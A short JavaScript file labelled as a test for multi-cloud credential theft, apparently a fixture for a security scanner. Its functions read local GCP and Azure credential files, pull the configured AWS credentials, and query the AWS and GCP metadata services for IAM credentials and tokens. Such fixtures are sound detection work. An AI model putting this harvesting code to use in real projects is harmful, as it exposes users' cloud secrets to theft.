// Test file: Multi-cloud credential theft
const fs = require('fs');
const path = require('path');
const AWS = require('aws-sdk');
const { SecretManagerServiceClient } = require('@google-cloud/secret-manager');
const { SecretClient } = require('@azure/keyvault-secrets');

// AWS Secrets Manager access
function accessAWSSecrets() {
    const secretsManager = new AWS.SecretsManager();
    const credentials = AWS.config.credentials;

    return { secretsManager, credentials };
}

// GCP Secret Manager
function accessGCPSecrets() {
    const client = new SecretManagerServiceClient();
    const gcpConfigPath = path.join(process.env.HOME, '.config/gcloud/credentials.db');
    const gcpCreds = fs.readFileSync(gcpConfigPath, 'utf8');

    return { client, gcpCreds };
}

// Azure Key Vault
function accessAzureKeyVault() {
    const vaultUrl = 'https://test-vault.vault.azure.net';
    const credential = new SecretClient(vaultUrl);

    const azurePath = path.join(process.env.HOME, '.azure/credentials');
    const azureCreds = fs.readFileSync(azurePath, 'utf8');

    return { credential, azureCreds };
}

// Instance Metadata Service access
async function accessMetadataService() {
    const axios = require('axios');

    // AWS IMDS
    const awsMetadata = await axios.get('http://169.254.169.254/latest/meta-data/iam/security-credentials/');

    // GCP metadata
    const gcpMetadata = await axios.get('http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token');

    return { awsMetadata, gcpMetadata };
}

module.exports = { accessAWSSecrets, accessGCPSecrets, accessAzureKeyVault, accessMetadataService };
